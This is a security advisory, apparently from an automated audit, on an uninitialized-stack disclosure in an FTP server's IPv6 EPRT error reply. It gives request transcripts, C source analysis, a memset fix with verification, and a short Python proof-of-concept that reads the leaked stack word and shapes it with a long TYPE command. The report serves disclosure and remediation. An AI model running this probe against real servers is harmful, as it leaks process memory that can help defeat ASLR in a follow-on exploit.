# Uninitialized stack memory disclosed in EPRT IPv6 error reply

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-11-17 10:20:42 UTC
**Target:** /workspace/source
**Endpoint:** EPRT
**CWE:** CWE-457
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Trivial

## Description

The IPv6 branch of the EPRT parser builds a struct sockaddr_storage on the stack and fills only the address family and the 16 address bytes, leaving sin6_scope_id uninitialized. When the supplied address differs from the control connection's peer, the structure is passed to getnameinfo(NI_NUMERICHOST), which appends `%<sin6_scope_id>` to the formatted address and returns uninitialized stack memory to the client in the 500 reply. An authenticated client can read four bytes of process stack per request, and the value changes with the commands executed earlier in the session.

## Evidence

Requests against the unmodified build (authenticated session, IPv6 EPRT address different from the peer):\n\n```text\nEPRT |2|2001:db8::1|1025|              -> 500 I won't open a connection to 2001:db8::1%3724148534 (only to 127.0.0.1)\nEPRT |2|::1|1025|                      -> 500 I won't open a connection to ::1%3724148534 (only to 127.0.0.1)\nEPRT |2|fe80::1|1025|                  -> 500 I won't open a connection to fe80::1%3724148534 (only to 127.0.0.1)\n```\n\nThe suffix is 0xddf9ff36, the uninitialized sin6_scope_id. It changes when the session executes other commands first, showing that it is stale stack content rather than a fixed constant:\n\n```text\n(no prior command)                     -> 2001:db8::1%3724148534   (0xddf9ff36)\nafter TYPE <4000-byte argument>        -> 2001:db8::1%2195888384   (0x82e29900)\nafter SITE CHMOD 777 <long name>       -> ::1%2195888384           (0x82e29900)\n```\n\nSame request against the patched build (memset added before generic_aton):\n\n```text\nEPRT |2|2001:db8::1|1025|  -> 500 I won't open a connection to 2001:db8::1 (only to 127.0.0.1)\nEPRT |2|::1|1025|          -> 500 I won't open a connection to ::1 (only to 127.0.0.1)\nEPRT |2|fe80::1|1025|      -> 500 I won't open a connection to fe80::1 (only to 127.0.0.1)\n```\n\nLegitimate behaviour after the fix (unchanged):\n\n```text\nEPRT |1|127.0.0.1|1024|  -> 200 PORT command successful\nEPRT |2|::1|1024|        -> 200 PORT command successful   (from an ::1 client)\nPORT 127,0,0,1,4,1       -> 200 PORT command successful\nPASV                     -> 227 Entering Passive Mode (...)\n```

## Impact

An authenticated client can read four bytes of uninitialized process stack per request through the EPRT error reply, and can influence which stale values are disclosed by the commands it issues first. This is a memory-disclosure primitive that can expose residual process data (including address/layout fragments useful for defeating ASLR in a follow-on exploit); in the tested build the disclosed word contained no directly sensitive value.

## Counterevidence

The leak only occurs on the IPv6 EPRT error path when the supplied address differs from the control-connection peer (the normal FXP-rejection reply); when the address matches the peer no address is formatted and nothing leaks. In this build the disclosed word was constant for a given command sequence and contained no recognizable secret, so the demonstrated impact is limited to four bytes of process memory per request rather than a direct credential or pointer disclosure. The IPv4 EPRT and PORT paths zero the structure and are unaffected. Confirmed by running the same requests against a patched build, which returns a plain address.

## What Would Change This Severity

Evidence that the disclosed words contain ASLR-relevant pointers or other sensitive process data in a production build would raise this finding; if the build always zeroes the field in practice (for example due to a zeroed stack), it would drop to informational.

## Technical Analysis

The IPv6 branch of the EPRT parser declares the address structure without initializing it:\n\n```c title=src/ftpd.c startLineNumber=838 endLineNumber=866\nstatic void do_ipv6_port(char *p, char delim)\n{\n    char *deb;\n    struct sockaddr_storage a;        /* uninitialized */\n    ...\n    if (generic_aton(deb, &a) != 0) {\n        goto nope;\n    }\n    doport2(a, (unsigned int) port);\n}\n```\n\n`generic_aton()` only sets the family (`ss_family`) and the 16 address bytes (`sin6_addr`); `sin6_flowinfo` and `sin6_scope_id` are left with whatever the stack contains. `doport2()` then compares the address with the control connection peer and, when they differ and FXP is not allowed, formats both addresses with `getnameinfo(..., NI_NUMERICHOST)`. glibc's IPv6 formatter appends `%<sin6_scope_id>` whenever the scope id is non-zero, so the uninitialized word is rendered as a decimal suffix in the `500` reply to the client.\n\nThe IPv4 EPRT branch (`memset(&a, 0, sizeof a);` before filling) and `doport()` already do this correctly, which confirms the omission is specific to the IPv6 helper.

## Proof of Concept

1. Build the tree and start `pure-ftpd` locally with a virtual user (for example `pure-ftpd -S <port> -E -j -A -l puredb:<db>`).\n2. Connect and authenticate (`USER`/`PASS`).\n3. Send `EPRT |2|2001:db8::1|1025|` - an IPv6 address that differs from the peer address.\n4. Observe the `500 I won't open a connection to 2001:db8::1%3724148534 (only to 127.0.0.1)` reply: the `%3724148534` suffix is the uninitialized `sin6_scope_id` (0xddf9ff36).\n5. Repeat on a fresh connection without any prior command: the same word is returned. Send a long command first (for example `TYPE` followed by a 4000-byte argument) and repeat the EPRT: the disclosed word changes (0x82e29900), proving it is stale stack content that the client can shape.\n6. Submit a very long EPRT and repeat the same correction, and the value can be sampled across a session; the fix removes the suffix entirely, returning the plain address.

```python
#!/usr/bin/env python3\n"""Read uninitialized stack memory through the IPv6 EPRT error reply."""\nimport re, socket, sys\n\nHOST, PORT = "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 2121\nUSER, PW = "user", "password"\n\ndef sample(shape=None):\n    s = socket.create_connection((HOST, PORT), timeout=10)\n    s.settimeout(10)\n    def rd():\n        try:\n            return s.recv(65535).decode("latin1")\n        except Exception:\n            return ""\n    rd()\n    s.sendall(b"USER " + USER.encode() + b"\\r\\n"); rd()\n    s.sendall(b"PASS " + PW.encode() + b"\\r\\n"); rd()\n    if shape:\n        s.sendall(shape + b"\\r\\n"); rd()\n    s.sendall(b"EPRT |2|2001:db8::1|1025|\\r\\n")\n    reply = rd()\n    s.close()\n    m = re.search(r"to (\\S+)", reply)\n    return reply.strip(), m.group(1) if m else None\n\nprint("clean session :", sample())\nprint("after TYPE    :", sample(b"TYPE " + b"A" * 4000))\n
```

## Code Analysis

**Location 1:** `src/ftpd.c` (lines 862-864)
  Zero the stack address structure before populating it (the IPv4 EPRT path already does this)

  **Suggested Fix:**
```diff
-     if (generic_aton(deb, &a) != 0) {
-         goto nope;
-     }
+     memset(&a, 0, sizeof a);
+     if (generic_aton(deb, &a) != 0) {
+         goto nope;
+     }
```

## Remediation

Zero the sockaddr_storage before populating it, as the IPv4 EPRT and PORT paths already do, so no uninitialized fields can reach getnameinfo. More generally, initialize every stack sockaddr structure at declaration and consider passing an explicit length from a single construction helper so partially filled address structures cannot be formatted or compared.

## Fix Verification

Applied the one-line change to a copy of the tree and rebuilt (`make -j4`, `make check`; both exit 0, no new warnings). The fix_before block was dumped with line numbers to confirm it matches the file character-for-character.\n\nSecurity closure: the same requests that previously returned `2001:db8::1%3724148534`, `::1%3724148534` and `fe80::1%3724148534` now return `2001:db8::1`, `::1` and `fe80::1`, including after the stack-shaping sequence (`TYPE` with a 4000-byte argument) that previously changed the disclosed word. The uninitialized read is gone because the whole structure is zeroed before it is populated.\n\nBypass review: both callers of `generic_aton()` were inspected. The IPv4 EPRT branch and `doport()` already `memset` the structure, and the remaining caller (the operator-only `-t` trusted-IP option at startup) only feeds `addrcmp()`, which compares address bytes and never formats the structure; it is not reachable by a client. Within `do_ipv6_port` the structure is used only for `doport3()` protocol selection, `addrcmp()` and `getnameinfo()`, all of which now see a fully defined structure.\n\nPreserved behaviour: `EPRT |1|...` and `EPRT |2|...` still succeed for matching addresses, the FXP rejection reply still names both addresses, `PORT` and `PASV` are unchanged, and numeric formatting of normal addresses is identical.\n\nGaps: the check is behavioural (no MemorySanitizer run, since an MSan-instrumented build was not produced); verification ran on a copy of the source tree, and the same one-line change applies to the live tree.

## Assumptions

The attacker can authenticate (any virtual or system user, including anonymous if enabled) and issue FTP commands; EPRT is offered on every supported build (FEAT advertises it). No non-default compile option is required.
